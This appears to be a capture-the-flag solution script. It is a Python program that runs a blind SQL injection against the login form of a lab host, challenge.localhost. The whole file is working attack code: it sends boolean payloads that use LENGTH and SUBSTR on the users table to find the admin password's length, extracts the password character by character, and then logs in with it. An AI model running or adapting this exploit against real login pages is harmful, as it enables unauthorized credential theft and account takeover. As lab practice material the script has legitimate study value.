import requests
import string

def find_password_length_linear():
    """Find password length using reliable linear search"""
    print("Finding password length using linear search...")
    
    for length in range(1, 101):
        payload = f"admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin')={length} --"
        
        response = requests.post(
            "http://challenge.localhost/",
            data={"username": payload, "password": "x"},
            allow_redirects=True  # Follow redirects like in method 2
        )
        
        # Check if we got a successful page (not showing invalid username error)
        if response.status_code == 200 and "Invalid username" not in response.text:
            print(f"✓ Password length is: {length} characters")
            return length
        
        # Show progress every 20 attempts
        if length % 20 == 0:
            print(f"  Checked up to length {length}...")
    
    print("Could not determine password length (tried 1-100)")
    return None

def extract_flag(length):
    """Extract the flag character by character using the working method"""
    print(f"\nExtracting {length} characters...")
    print("-" * 60)
    
    flag = ""
    chars = string.ascii_letters + string.digits + "{}_-!@#$%^&*()[]|:;<>,.?/~`+="
    
    for position in range(1, length + 1):
        found_char = None
        
        for char in chars:
            # Escape single quotes
            escaped_char = char.replace("'", "''")
            
            payload = f"admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'), {position}, 1)='{escaped_char}' --"
            
            response = requests.post(
                "http://challenge.localhost/",
                data={"username": payload, "password": "x"},
                allow_redirects=True  # Follow redirects
            )
            
            # Check if we got a successful page
            if response.status_code == 200 and "Invalid username" not in response.text:
                found_char = char
                flag += char
                print(f"[{position:2d}/{length}] '{char}' -> {flag}")
                break
        
        if not found_char:
            # Try without escaping (for some characters)
            for char in ["{", "}", "_", "-", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "[", "]", "|", ":", ";", "<", ">", ",", ".", "?", "/", "~", "`", "+", "="]:
                payload = f"admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'), {position}, 1)='{char}' --"
                
                response = requests.post(
                    "http://challenge.localhost/",
                    data={"username": payload, "password": "x"},
                    allow_redirects=True
                )
                
                if response.status_code == 200 and "Invalid username" not in response.text:
                    found_char = char
                    flag += char
                    print(f"[{position:2d}/{length}] '{char}' -> {flag}")
                    break
        
        if not found_char:
            flag += "?"
            print(f"[{position:2d}/{length}] Unknown character")
    
    return flag

def verify_extraction(extracted_flag):
    """Verify the extracted flag"""
    print("\nVerifying extracted flag...")
    
    # Try to login with the actual password
    response = requests.post(
        "http://challenge.localhost/",
        data={"username": "admin", "password": extracted_flag},
        allow_redirects=True
    )
    
    if "Hello, admin!" in response.text:
        print("✓ SUCCESS: Flag verification passed!")
        return True
    else:
        print("✗ WARNING: Flag verification failed")
        return False

# Main execution
print("=" * 60)
print("COMPLETE ADMIN PASSWORD EXTRACTOR")
print("=" * 60)

# Step 1: Find password length
password_length = find_password_length_linear()

if password_length:
    print(f"\nStep 1 complete: Password length = {password_length}")
    
    # Step 2: Extract the flag
    flag = extract_flag(password_length)
    
    print("\n" + "=" * 60)
    print("EXTRACTION COMPLETE")
    print("=" * 60)
    
    if '?' in flag:
        print(f"⚠️  Partial extraction (some characters unknown): {flag}")
        print("Unknown characters shown as '?'")
    else:
        print(f"🎯 ADMIN PASSWORD: {flag}")
        
        # Step 3: Verify the extraction
        verify_extraction(flag)
        
        print(f"\n💡 The admin password is the flag: {flag}")
else:
    print("Failed to determine password length. Cannot proceed with extraction.")
